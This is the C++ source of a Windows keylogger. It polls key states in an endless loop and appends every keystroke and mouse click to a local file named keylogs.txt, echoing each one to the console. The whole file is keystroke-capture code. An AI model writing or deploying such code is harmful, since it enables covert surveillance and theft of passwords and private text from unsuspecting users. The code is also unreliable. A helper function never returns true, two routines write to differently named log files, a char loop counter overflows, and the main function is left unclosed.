#include <Windows.h>
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

using namespace std;


void WriteToLog(LPCSTR text)
{
    ofstream logfile;                            // creates object for file stream
    logfile.open(" keylogs.txt ", fstream::app); // opens file for writing
    logfile << text;                             // writes text string to file
    logfile.close();                             // close stream
}

bool KeyIsListed(int iKey)
{
    switch (iKey)
    {
    case VK_SPACE:
        cout << " ";     // if space bar is pressed print space to console
        WriteToLog(" "); // write space to logfile
        break;
    case VK_RETURN:
        cout << "\n"; // same as above, expect now "enter" is  counted
        WriteToLog("\n");
        break;
    case VK_SHIFT:
        cout << "  *Shift* ";
        WriteToLog(" * Shift* ");
        break;

    case VK_BACK:
        cout << "\b"; // emilates backspace
        WriteToLog("\b");
        break;

    case VK_RBUTTON:
    cout<<" *rclick* ";
    WriteToLog(" *rclick* ");
    break;

    case VK_LBUTTON:
    cout<<" *lclick* ";
    WriteToLog(" *lclick* ");
    break;

    default:
        return false;
    }
}

int main()
{
    char key;
    while (TRUE)
    {
        sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeyIsListed(key) == FALSE)
                {
                    cout<<key;
                    ofstream logfile;  //creates object for filestream                        // creates object for file system
                    logfile.open("keylogs.txt", fstream::app); // opens the file for writing
                    logfile << key;                            // writes the logged key to the file
                    logfile.close();
                }
            }
        }
    }
